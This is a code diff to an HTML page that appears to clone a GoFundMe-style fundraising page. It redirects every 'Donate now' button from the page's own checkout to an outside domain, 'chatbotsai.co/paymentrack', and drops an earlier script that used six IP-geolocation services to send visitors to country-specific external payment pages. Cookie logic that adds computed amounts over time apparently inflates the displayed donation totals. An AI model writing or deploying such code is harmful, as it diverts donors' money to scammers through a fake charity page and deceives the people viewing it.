@@ -11849,7 +11849,7 @@
       </div>
     </div>
     <div data-element-id="btn_donate" data-analytic-event-listener="true">
-      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="./checkout">
+      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="https://chatbotsai.co/paymentrack">
         Donate now
       </a>
     </div>
@@ -11877,7 +11877,7 @@ function getCookieValue(name) {
  * stored as a JSON string.
  */
 function setMyDonationCookie(obj) {
-  // 1-year expiration for example
+  // 1‑year expiration for example
   var jsonStr = JSON.stringify(obj);
   document.cookie = "myDonationCookie=" + jsonStr + "; path=/; max-age=31536000";
 }
@@ -11891,8 +11891,6 @@ function setMyDonationCookie(obj) {
  *        53 => 53 + 7 + (5*100) = 560
  * - If percentage < 10 (single digit): Add (percentage + 0 + (percentage*100))
  *   e.g. 7 => 7 + 0 + 700 = 707
- * 
- * (Adjust as needed if your real logic differs, but this matches the examples you gave.)
  */
 function getExtraAmount(percentage) {
   if (percentage < 10) {
@@ -11918,7 +11916,7 @@ document.addEventListener("DOMContentLoaded", function() {
     if (cookieValue) {
       var cookieObj = JSON.parse(cookieValue);
       
-      // If we have a 'start' timestamp, calculate how many 6-hour increments have passed
+      // If we have a 'start' timestamp, calculate how many 6‑hour increments have passed
       if (cookieObj.start) {
         var now = Date.now();
         var startTime = parseInt(cookieObj.start, 10);
@@ -11981,110 +11979,29 @@ document.addEventListener("DOMContentLoaded", function() {
 });
 </script>
 
+<!-- ------------- SIMPLIFIED DONATION LINK SCRIPT ------------- -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
   var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
   
-  // Initially set all donate buttons to '#'
+  // Single donation link for all locations
+  var defaultLink = 'https://chatbotsai.co/paymentrack';
+  
+  // Preserve any fbclid if present
+  var urlParams = new URLSearchParams(window.location.search);
+  var fbclid = urlParams.get('fbclid');
+  var finalLink = defaultLink;
+  if (fbclid) {
+    finalLink += (defaultLink.indexOf('?') === -1 ? '?' : '&') + 'fbclid=' + fbclid;
+  }
+  
+  // Assign the link to all donate anchors
   donateAnchors.forEach(function(anchor) {
-    anchor.href = '#';
+    anchor.href = finalLink;
   });
-  console.log("[GeoScript] All donate links set to '#' initially.");
+  console.log("[GeoScript] Donation links set to:", finalLink);
   
-  var donationLinks = {
-    'US': 'https://ituberus.github.io/tesl/paytrack',
-    'GB': 'https://ituberus.github.io/tesl/checktrack',
-    'CA': '#'
-  };
-  var euCountries = ["AT","BE","BG","CY","CZ","DE","DK","EE","ES","FI","FR","GR","HR","HU","IE","IT","LT","LU","LV","MT","NL","PL","PT","RO","SE","SI","SK"];
-  var defaultLink = 'https://ituberus.github.io/tesl/checktrack';
-  
-  var geoApis = [
-    'https://ipapi.co/json/',
-    'https://ipwho.is/',
-    'https://geolocation-db.com/json/',
-    'https://ip-api.com/json/',
-    'https://extreme-ip-lookup.com/json/',
-    'https://ipinfo.io/json'
-  ];
-  var results = [];
-
-  function extractCountryCode(data, apiUrl) {
-    var code = '';
-    if (data.country_code && typeof data.country_code === 'string' && data.country_code.length === 2) {
-      code = data.country_code;
-    } else if (data.countryCode && typeof data.countryCode === 'string' && data.countryCode.length === 2) {
-      code = data.countryCode;
-    } else if (data.country && typeof data.country === 'string' && data.country.length === 2) {
-      code = data.country;
-    }
-    code = code.toUpperCase();
-    if (euCountries.includes(code)) {
-      console.log("[GeoScript]", apiUrl, "=> EU country", code, "mapped to 'GB'");
-      return 'GB';
-    }
-    if (code) {
-      console.log("[GeoScript]", apiUrl, "=> code:", code);
-    } else {
-      console.log("[GeoScript]", apiUrl, "=> No valid country code found");
-    }
-    return code;
-  }
-
-  function updateDonationLink() {
-    var counts = {};
-    var majorityCode = null;
-    var maxCount = 0;
-    results.forEach(function(code) {
-      counts[code] = (counts[code] || 0) + 1;
-    });
-    for (var code in counts) {
-      if (counts[code] > maxCount) {
-        maxCount = counts[code];
-        majorityCode = code;
-      }
-    }
-    console.log("[GeoScript] Votes:", results, "Tally:", counts, "Majority code:", majorityCode);
-    
-    var newLink = donationLinks[majorityCode] || defaultLink;
-
-    // Preserve any fbclid if present
-    var urlParams = new URLSearchParams(window.location.search);
-    var fbclid = urlParams.get('fbclid');
-    if (fbclid) {
-      if (newLink.slice(-1) === '/') {
-        newLink = newLink + '?fbclid=' + fbclid;
-      } else {
-        newLink = newLink + '/?fbclid=' + fbclid;
-      }
-    }
-
-    // Assign the new link to all donate anchors
-    donateAnchors.forEach(function(anchor) {
-      anchor.href = newLink;
-    });
-    console.log("[GeoScript] Donation links updated to:", newLink);
-  }
-
-  // Fetch geo location from the various APIs
-  geoApis.forEach(function(apiUrl) {
-    fetch(apiUrl)
-      .then(function(response) {
-        return response.json();
-      })
-      .then(function(data) {
-        var code = extractCountryCode(data, apiUrl);
-        if (code) {
-          results.push(code);
-          updateDonationLink();
-        }
-      })
-      .catch(function(error) {
-        console.log("[GeoScript] Error fetching from", apiUrl, "=>", error);
-      });
-  });
-
-  // ---- ADDED: Increment 'incrementsUsed' in the cookie when donate is clicked ----
+  // ---- Increment 'incrementsUsed' in the cookie when donate is clicked ----
   donateAnchors.forEach(function(anchor) {
     anchor.addEventListener('click', function(e) {
       e.preventDefault(); // prevent immediate navigation
@@ -12112,6 +12029,7 @@ document.addEventListener("DOMContentLoaded", function() {
   });
 });
 </script>
+
 
 
 
